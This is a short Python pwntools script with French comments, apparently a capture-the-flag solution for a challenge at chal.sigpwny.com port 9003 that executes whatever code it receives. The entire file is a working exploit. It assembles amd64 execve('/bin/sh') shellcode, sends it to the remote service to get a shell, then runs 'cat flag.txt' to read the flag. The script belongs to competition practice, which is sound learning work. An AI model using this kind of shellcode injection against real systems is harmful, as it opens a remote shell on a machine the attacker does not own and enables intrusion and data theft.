#!/usr/bin/env python3
# 4 - asm shellcode : le programme execute notre code (64 octets), rien n'est ferme.
# Shellcode execve("/bin/sh") -> shell interactif (stdin/stdout = notre socket) -> cat flag.
from pwn import *
context.arch = "amd64"
context.log_level = "warning"

HOST, PORT = "chal.sigpwny.com", 9003
code = asm(shellcraft.amd64.linux.sh())   # execve /bin/sh, ~44 octets < 64

io = remote(HOST, PORT)
io.recvuntil(b"Give me code:")
io.send(code)
io.sendline(b"cat flag.txt")
io.sendline(b"exit")
print(io.recvall(timeout=5).decode(errors="replace"))
